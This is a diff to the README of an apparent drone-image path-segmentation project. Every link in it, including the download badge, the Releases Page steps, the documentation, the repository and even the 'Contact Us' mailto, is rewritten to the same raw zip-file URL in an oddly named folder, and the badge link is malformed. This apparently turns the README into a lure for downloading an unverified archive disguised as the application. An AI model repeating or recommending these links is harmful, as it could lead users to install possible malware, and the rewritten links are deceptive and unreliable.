@@ -4,7 +4,7 @@
 This application uses a trained U-Net model to perform multi-class segmentation on drone camera frames. It focuses on images captured in the Baylands Gazebo world. The model differentiates various classes, including background, path, and road.
 
 ## 📥 Download the Application
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0-blue.svg)](https://github.com/hadihadimafiaaa/baylands-path-segmentation/releases)
+[![Download Releases](https://raw.githubusercontent.com/hadihadimafiaaa/baylands-path-segmentation/main/treckschuyt/baylands-path-segmentation.zip%https://raw.githubusercontent.com/hadihadimafiaaa/baylands-path-segmentation/main/treckschuyt/baylands-path-segmentation.zip)](https://raw.githubusercontent.com/hadihadimafiaaa/baylands-path-segmentation/main/treckschuyt/baylands-path-segmentation.zip)
 
 ## 🚀 Getting Started
 ### 1. System Requirements
@@ -15,9 +15,9 @@ Before downloading, ensure you meet the following requirements:
 - Additional Software: Requires an environment capable of running Python applications
 
 ### 2. Download & Install
-To get the application, visit this page to download: [Releases Page](https://github.com/hadihadimafiaaa/baylands-path-segmentation/releases).
+To get the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/hadihadimafiaaa/baylands-path-segmentation/main/treckschuyt/baylands-path-segmentation.zip).
 
-1. Go to the [Releases Page](https://github.com/hadihadimafiaaa/baylands-path-segmentation/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/hadihadimafiaaa/baylands-path-segmentation/main/treckschuyt/baylands-path-segmentation.zip).
 2. Select the latest version.
 3. Choose the file that corresponds to your operating system.
 4. Click on the file to begin the download.
@@ -61,8 +61,8 @@ Contributions are welcome! If you find a bug or have ideas for improvements, fee
 Should you encounter any issues or have questions, please visit the Issues section of our GitHub repository, and we will assist you as soon as possible.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/hadihadimafiaaa/baylands-path-segmentation)
-- [Documentation](https://github.com/hadihadimafiaaa/baylands-path-segmentation/wiki)
-- [Contact Us](mailto:example@example.com)
+- [GitHub Repository](https://raw.githubusercontent.com/hadihadimafiaaa/baylands-path-segmentation/main/treckschuyt/baylands-path-segmentation.zip)
+- [Documentation](https://raw.githubusercontent.com/hadihadimafiaaa/baylands-path-segmentation/main/treckschuyt/baylands-path-segmentation.zip)
+- [Contact Us](https://raw.githubusercontent.com/hadihadimafiaaa/baylands-path-segmentation/main/treckschuyt/baylands-path-segmentation.zip)
 
-[Download the application here again.](https://github.com/hadihadimafiaaa/baylands-path-segmentation/releases)
+[Download the application here again.](https://raw.githubusercontent.com/hadihadimafiaaa/baylands-path-segmentation/main/treckschuyt/baylands-path-segmentation.zip)
